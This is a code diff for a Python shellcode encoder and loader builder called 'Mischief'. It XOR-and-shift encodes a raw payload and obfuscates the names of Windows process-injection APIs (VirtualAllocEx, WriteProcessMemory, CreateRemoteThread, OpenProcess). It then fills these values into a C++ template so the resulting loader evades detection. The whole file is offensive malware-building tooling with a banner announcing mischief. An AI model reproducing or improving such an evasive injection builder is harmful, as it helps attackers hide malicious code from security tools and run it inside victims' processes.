@@ -20,17 +20,19 @@ KERNEL32 = ("\x6B\x65\x72\x6E\x65\x6C\x33\x32")
 DEBUG = False
 
 def open_file(path):
-	if os.path.exists(path) and os.path.isfile(path):
-		print(f"> Reading payload: {path}")
+	if os.path.exists(path):
+		print(f"> Reading file: {path}")
 
 		with open(path,"rb") as file:
 			data = file.read()
 			file.close()
 
-			if data > 0:
+			if len(data) > 0:
 				return data
 			else:
 				raise Exception(f"File is empty - {file}")
+	else:
+		raise Exception(f"Error - Check your file/path: {path}")
 
 
 def gen_string(length):
@@ -49,11 +51,24 @@ def print_int(type, name, data):
 		print(formatted)
 	return formatted
 
+
+def gen_hex(data):
+	raw = ''
+	length = len(data)
+
+	for i in range(0, length):
+		if i == length - 1:
+			raw += hex(data[i]).replace('0x', 'x')
+		else:
+			raw += hex(data[i]).replace('0x', 'x') + "\\"
+
+	return f"\\{raw}"
+
+
 def print_hex_formatted(name, data):
 	# Format data to be put into the template
 	raw = ''
 	length = len(data)
-
 
 	for i in range(0,length):
 		if i == length -1:
@@ -88,60 +103,48 @@ def xor(byte1, byte2):
 def encode_string(string, name):
 	key = gen_string(len(string))
 
-	print_hex_formatted(f"{name}_key", key)
+	#print_hex_formatted(f"{name}_key", key)
 
 	encoded = bytearray()
 
 	for i in range(0,len(key)):
 		encoded.append(xor(key[i], string[i]))
 
-	return encoded
+	return key, encoded
 
 
 def encode_byte(key, key2, shift, byte):
 	# XOR with first byte key
+	global DEBUG
+
 	r1 = xor(key,byte)
+
+	#debug(f'{hex(key)} ^ {hex(byte)} == {hex(r1)}')
 
 	# Circ shift & 0xFF
 	r2 = circshift(r1,shift)
 
-	return xor(r2, key2)
+	#debug(f'{hex(r1)} SHIFT {hex(shift)} == {hex(r2)}')
 
-	return r3
+	return xor(r2, key2)
 
 
 def encode_shellcode(data):
 	if DEBUG:
 		debug(f"Key: {KEY} - Shift: {SHIFT} - KEY2: {KEY2}")
 
-		key = print_int("unsigned char", "key",KEY)
-		key2 = print_int("unsigned char", "key2", KEY2)
-		shift = print_int("int", "shift", SHIFT)
+		#key = print_int("unsigned char", "key",KEY)
+		#key2 = print_int("unsigned char", "key2", KEY2)
+		#shift = print_int("int", "shift", SHIFT)
 
 	for i in range(0,len(data)):
 		data[i] = encode_byte(KEY, KEY2, SHIFT, data[i])
+		#print(hex(data[i]))c
 
-	return data,key,key2,shift
-
-def encode_strings(path,data):
-	print("> Encoding Strings")
-
-	vallocex = encode_string(string_to_bytes(VIRTALLOCEX), 'vallocx')
-	rmthread = encode_string(string_to_bytes(CREATEREMOTETHREAD), 'remote_thread')
-	openProc = encode_string(string_to_bytes(OPENPROC), 'open_proc')
-	writeProc = encode_string(string_to_bytes(WRITEPROCMEM), 'write_proc')
-	closeHandle = encode_string(string_to_bytes(CLOSEHANDLE), 'close_handle')
-	kernel32 = encode_string(string_to_bytes(KERNEL32), 'kernel32')
-
-	print_hex_formatted('vallocex',vallocex)
-	print_hex_formatted('rmthread',rmthread)
-	print_hex_formatted('openPRC',openProc)
-	print_hex_formatted('writePRC',writeProc)
-	print_hex_formatted('closeHandle',closeHandle)
-	print_hex_formatted('kernel32', kernel32)
+	return data
 
 def write_template(modified_template,path):
-	with open(path, "wb") as file:
+	with open(path, "w") as file:
 		file.write(modified_template)
 		file.close()
 
@@ -151,14 +154,18 @@ def write_template(modified_template,path):
 
 def generate_shellcode(shellcode):
 	print("> Encoding shellcode...")
-	raw = string_to_bytes(shellcode)
+	#raw = string_to_bytes(shellcode)
 
-	encoded_shellcode = encode_shellcode(raw)
+	encoded_shellcode = encode_shellcode(shellcode)
+
 
 	return encoded_shellcode
 
 def check_keys():
 	print("> Verifying XOR keys..")
+	global KEY
+	global KEY2
+
 	if KEY == KEY2:
 		KEY = randint(1,255)
 
@@ -166,38 +173,83 @@ def check_keys():
 		debug(f"Payload keys: {KEY} - {KEY2}")
 
 
-def generate(path2shell,path2template,pathout):
+def generate(path2shell,path2template):
+
+	debug(f'Path2shell: {path2shell}')
+	debug(f'Path2template: {path2template}')
+
+
+
 	# Read template file
 	template = open_file(path2template)
 	check_keys()
+	global KEY
+	global KEY2
 
-	key_place = 'unsigned char key = "place_key";'
-	key2_place = 'unsigned char key2 = "place_key2";'
-	shift_place = 'int shift = "place_shift";'
-	shellcode_place = 'unsigned char shellcode[] = "place_shellcode";'
-	vallockey_place = 'unsigned char vallocx_key[] = "place_vallocx_key";'
-	openprockey_place = 'unsigned char open_proc_key[] = "place_open_proc_key";'
-	writeprockey_place = 'unsigned char write_proc_key[] = "place_write_proc_key";'
-	closehandlekey_place = 'unsigned char close_handle_key[] = "place_close_handle_key";'
-	kernelkey_place = 'unsigned char kernel32_key[] = "place_kernel32_key";'
-	valloc_place ='unsigned char vallocex[] = "place_vallocex";'
-	openprc_place = 'unsigned char openPRC[] = "place_openPRC";'
-	writeprc_place = 'unsigned char writePRC[] = "place_writePRC";'
-	handle_place = 'unsigned char closeHandle[] = "place_closeHandle";'
-	kernel_place = 'unsigned char kernel32[] = "place_kernel32";'
+	key_place = 'place_key'
+	key2_place = 'place_2key'
+	shift_place = 'place_shift'
+	shellcode_place = 'place_shellcode'
+	vallockey_place = 'place_k_vallocx'
+	openprockey_place = 'place_open_proc_key'
+	writeprockey_place = 'place_write_proc_key'
+	closehandlekey_place = 'place_close_handle_key'
+	kernelkey_place = 'place_k_kernel32'
+	valloc_place ='place_vallocex'
+	openprc_place = 'place_openPRC'
+	writeprc_place = 'place_writePRC'
+	handle_place = 'place_closeHandle'
+	kernel_place = 'place_kernel32'
 
 
 
 	# Read our shellcode file
-	raw_shellcode = open_file(path2shell)
+	raw_shellcode = bytearray(open_file(path2shell))
+
+	#print_hex_formatted("test", raw_shellcode)
+
 	# Encode the shellcode
-	encoded_shellcode,key,key2,shift = generate_shellcode(raw_shellcode)
 
-	template.replace(key_place, key)
-	template.replace(key2_place, key2)
-	template.replace(shift_place, shift)
+	encoded_shellcode= generate_shellcode(raw_shellcode)
+
+	shellcode_string = gen_hex(encoded_shellcode)
+
+	vallocx_key, vallocex = encode_string(string_to_bytes(VIRTALLOCEX), 'vallocx')
+	rmthread_key, rmthread = encode_string(string_to_bytes(CREATEREMOTETHREAD), 'remote_thread')
+	openproc_key, openProc = encode_string(string_to_bytes(OPENPROC), 'open_proc')
+	writeproc_key, writeProc = encode_string(string_to_bytes(WRITEPROCMEM), 'write_proc')
+	closehandle_key, closeHandle = encode_string(string_to_bytes(CLOSEHANDLE), 'close_handle')
+	kernel32key, kernel32 = encode_string(string_to_bytes(KERNEL32), 'kernel32')
 
 
+	if DEBUG:
+		debug(f'Shellcode: {shellcode_string}')
+		debug(f'vallocex: {gen_hex(vallocex)} - key: {gen_hex(vallocx_key)}')
+		debug(f'rmthread: {rmthread} - key: {rmthread_key}')
+		debug(f'openProc: {openProc} - key: {openproc_key}')
+		debug(f'writeProc: {writeProc} - key: {writeproc_key}')
+		debug(f'closehandle: {closeHandle} - key: {closehandle_key}')
+		debug(f'kernel32: {kernel32} - key: {kernel32key}')
+
+
+	temp_dec = template.decode('utf-8')
+	temp_dec = temp_dec.replace(key_place, str(KEY))
+	temp_dec = temp_dec.replace(key2_place, str(KEY2))
+	temp_dec = temp_dec.replace(shift_place, str(SHIFT))
+	temp_dec = temp_dec.replace(shellcode_place, shellcode_string)
+	temp_dec = temp_dec.replace(vallockey_place, gen_hex(vallocx_key))
+	temp_dec = temp_dec.replace(valloc_place, gen_hex(vallocex))
+	temp_dec = temp_dec.replace(openprc_place, gen_hex(openProc))
+	temp_dec = temp_dec.replace(openprockey_place, gen_hex(openproc_key))
+	temp_dec = temp_dec.replace(writeprockey_place, gen_hex(writeproc_key))
+	temp_dec = temp_dec.replace(writeprc_place, gen_hex(writeProc))
+	temp_dec = temp_dec.replace(handle_place, gen_hex(closeHandle))
+	temp_dec = temp_dec.replace(closehandlekey_place, gen_hex(closehandle_key))
+	temp_dec = temp_dec.replace(kernelkey_place, gen_hex(kernel32key))
+	temp_dec = temp_dec.replace(kernel_place, gen_hex(kernel32))
+
+
+	return temp_dec
 
 
 def print_banner():
@@ -236,6 +288,10 @@ def print_banner():
 	............    ....................................................   .........""")
 	print("\n\nLets Cause Some Mischief.")
 
+def set_verbose():
+	global DEBUG
+	DEBUG = True
+
 if __name__ == "__main__":
 
 	parser = argparse.ArgumentParser(description='Mischief Shellcode Encoder and Executor.. ')
@@ -247,19 +303,18 @@ if __name__ == "__main__":
 						help='Execution method: Call, NtCreateThread... ', required=False,
 						metavar='method')
 	parser.add_argument('--verbose',
-						help='Displays Debug info ', required=False,
-						metavar='verbose')
+						help='Displays Debug info ', required=False, action="store_true")
 
 	args = parser.parse_args()
 	outfile = args.out
 	shellcode_file = args.payload
 
-	# Cheap check if our keys are the same.
+	if args.verbose:
+		set_verbose()
 
-
-	if args.method is None or args.method == "Call":
-		gen
-
+	if args.method is None or args.method == "call":
+		mod_template = generate("C:\\Users\\Mitchell\\source\\repos\\Mischief\\Mischief-Encoder\\payload.bin","C:\\Users\\Mitchell\\source\\repos\\Mischief\\Mischief-Encoder\\main.cpp")
+		write_template(mod_template, "C:\\Users\\Mitchell\\source\\repos\\Mischief\\Mischief-Encoder\\test.cpp")
 
 
 
